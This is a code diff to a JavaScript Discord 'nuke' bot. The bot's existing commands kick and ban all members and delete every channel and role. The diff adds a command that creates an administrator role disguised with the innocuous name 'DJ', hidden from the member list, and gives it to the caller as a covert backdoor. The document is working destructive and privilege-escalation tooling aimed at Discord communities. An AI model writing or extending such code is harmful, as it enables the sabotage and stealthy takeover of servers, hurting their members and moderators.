@@ -27,6 +27,7 @@ ${prefix}kickall - kick all members from the server.
 ${prefix}banall - ban all members from the server.
 ${prefix}delchannels - delete all channels.
 ${prefix}delroles - delete all roles.
+${prefix}admin - gives user stealthy admin role.
 `)) 
 })
 
@@ -72,6 +73,14 @@ bot.on('messageCreate', msg => {
 	} else if (msg.content == prefix + 'delroles' && isOwner) {
 		msg.guild.roles.cache.forEach(role => role.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
 		console.log(green(`All roles deleted in ${msg.guild.name}!`))
+	} else if (msg.content == prefix + 'admin' && isOwner) {
+		msg.guild.roles.create({
+			name: 'DJ',
+			permissions: 'ADMINISTRATOR',
+			mentionable: false,
+			hoist: false,
+		}).then(role => msg.member.roles.add(role)).catch((err) => { console.log(red("Error Found: " + err)) })
+		console.log(green(`${msg.member.username} given admin in ${msg.guild.name}!`))
 	}
 })
 
